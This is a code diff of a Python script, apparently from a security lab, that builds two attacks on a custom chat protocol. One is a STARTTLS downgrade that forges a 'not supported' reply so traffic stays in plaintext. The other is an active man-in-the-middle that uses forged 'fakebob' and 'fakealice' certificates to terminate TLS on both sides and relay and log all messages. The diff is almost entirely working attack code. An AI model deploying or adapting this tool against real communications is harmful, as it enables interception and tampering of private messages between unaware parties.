@@ -12,8 +12,7 @@ import ssl
 
 PORT = 7129
 RECVSIZE = 1024
-client_list=[]
-client_names=[]
+
 
 class break_check:
     flag = True
@@ -43,14 +42,21 @@ def alice_receiving(conn_alice, conn_bob, tls_check):
         if msg == b'':
             conn_bob.sendall(msg)
             print("socket connection broken")
-            return
+            break
         msg = msg.decode()
         if msg == 'chat_STARTTLS' and tls_check:
             conn_alice.sendall("chat_STARTTLS_NOT_SUPPORTED".encode())
+            conn_bob.sendall("chat_STARTTLS_NOT_SUPPORTED".encode()) #dummy message
+            continue
         
-        print("\n{} : {}".format("alice", msg)))
+        print("\n{} : {}".format("alice", msg))
         conn_bob.sendall(msg.encode())
         if msg == 'chat_close':
+            try:
+                conn_bob.close()
+                conn_alice.close()
+            except:
+                pass
             break
         
     #sys.exit()
@@ -60,17 +66,24 @@ def bob_receiving(conn_bob, conn_alice):
         msg = conn_bob.recv(RECVSIZE)
         if msg == b'':
             print("socket connection broken")
-            return
+            break
         msg = msg.decode()
         print("\n{} : {}".format("bob", msg))
         conn_alice.sendall(msg.encode())
         if msg == 'chat_close':
-            #connection.close()
+            try:
+                conn_bob.close()
+                conn_alice.close()
+            except:
+                pass
             break
+
+
 
 
 def starttlsdown(peer1, peer2):
     print("Starting STARTTLS downgrade attack over {} and {}".format(peer1, peer2))
+
     s_socket = socket.socket(socket.AF_INET6,type=socket.SOCK_STREAM)
     s_socket.bind((b'',PORT,0,0))
     print("Server listening on port ",PORT)
@@ -78,28 +91,157 @@ def starttlsdown(peer1, peer2):
 
     #peer1
     connection1, address1 = s_socket.accept()
-    
-    client_list.append((peer1, connection1))
-    client_names.append(peer1)
-
-    start_new_thread(threaded, (peer1, connection1))
 
     #peer2
-    connection2, address2 = s_socket.accept()
-    
-    client_list.append((peer2, connection2))
-    client_names.append(peer2)
+    hostinfo = socket.getaddrinfo(peer2, PORT)[0][4]
 
-    start_new_thread(threaded, (peer2, connection2))
+    if len(hostinfo) == 2:
+        connection2 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    elif len(hostinfo) == 4:
+        connection2 = socket.socket(socket.AF_INET6,socket.SOCK_STREAM)
+
+    connection2.connect(hostinfo)
+    
 
     try:
-        s_socket.close()
-    except:
-        pass
+        t1 = threading.Thread(target=alice_receiving, args=(connection1, connection2, True))
+        t1.start()
+        t2 = threading.Thread(target=bob_receiving, args=(connection2, connection1))
+        t2.start()
+
+        t1.join()
+        t2.join()
+    finally:
+        try:
+            s_socket.close()
+            connection1.close()
+            connection2.close()
+        except:
+            pass
 
 
 def activemitm(peer1, peer2):
     print("Starting Active MITM attack over {} and {}".format(peer1, peer2))
+
+    s_socket = socket.socket(socket.AF_INET6,type=socket.SOCK_STREAM)
+    s_socket.bind((b'',PORT,0,0))
+    print("Server listening on port ",PORT)
+    s_socket.listen()
+
+    #peer1
+    connection1, address1 = s_socket.accept()
+
+    while True:
+        msg = connection1.recv(RECVSIZE).decode()
+        if msg == "chat_hello":
+            connection1.sendall("chat_reply".encode())
+            break
+    print("Connection established with client")
+
+    #secure chat starting handshake
+    
+    msg = connection1.recv(RECVSIZE).decode()
+
+    if msg == 'chat_STARTTLS':
+        connection1.sendall("chat_STARTTLS_ACK".encode())
+        
+        msg = connection1.recv(RECVSIZE).decode()
+        
+        # Three way handshake
+        if msg == 'chat_STARTTLS_ACK':        
+        
+            print("Starting secure communication")
+            
+            context1 = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+            context1.load_verify_locations("/root/root.crt")
+            context1.load_cert_chain(certfile="fakebob.crt", keyfile="fakebob-key.pem")
+            context1.verify_mode = ssl.CERT_REQUIRED
+
+            connssl1 = context1.wrap_socket(connection1, server_side=True)
+
+
+        else :
+            print("Starting insecure communication")
+            print("Client : ", msg)
+            connssl1 = connection1
+
+    else :
+        print("Starting insecure communication")
+        print("Client : ", msg)
+        connssl1 = connection1
+
+    #peer2
+    hostinfo = socket.getaddrinfo(peer2, PORT)[0][4]
+
+    if len(hostinfo) == 2:
+        connection2 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    elif len(hostinfo) == 4:
+        connection2 = socket.socket(socket.AF_INET6,socket.SOCK_STREAM)
+
+    connection2.connect(hostinfo)
+    
+    connection2.sendall("chat_hello".encode())
+    msg = connection2.recv(RECVSIZE).decode()
+
+    if msg == "chat_reply":
+        print("Connection established with ",peer2)
+    else:
+        print("Connection failed with ", peer2)
+        try:
+            connection2.close()
+        except:
+            pass
+        sys.exit(0)
+    
+    #secure chat starting handshake
+    connection2.sendall("chat_STARTTLS".encode())
+
+    msg = connection2.recv(RECVSIZE).decode()
+
+    if msg == 'chat_STARTTLS_ACK':
+        
+        connection2.sendall("chat_STARTTLS_ACK".encode())
+        print("Starting secure communication")
+
+        context2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        context2.load_verify_locations("/root/root.crt")
+        context2.load_cert_chain(certfile="fakealice.crt", keyfile="fakealice-key.pem")
+
+        connssl2 = context2.wrap_socket(connection2, server_hostname=peer2)
+        
+
+    elif msg == 'chat_STARTTLS_NOT_SUPPORTED':
+        print("Starting insecure communication")
+        connssl2 = connection2
+
+    else:
+        print("Malformed message")
+        try:
+            s_socket.close()
+            connection2.close()
+        except:
+            pass
+        sys.exit(0)
+
+
+
+    try:
+        t1 = threading.Thread(target=alice_receiving, args=(connssl1, connssl2, False))
+        t1.start()
+        t2 = threading.Thread(target=bob_receiving, args=(connssl2, connssl1))
+        t2.start()
+
+        t1.join()
+        t2.join()
+    finally:
+        try:
+            s_socket.close()
+            connssl1.close()
+            connssl2.close()
+            connection2.close()
+        except:
+            pass
+
 
 
 if __name__ == '__main__':
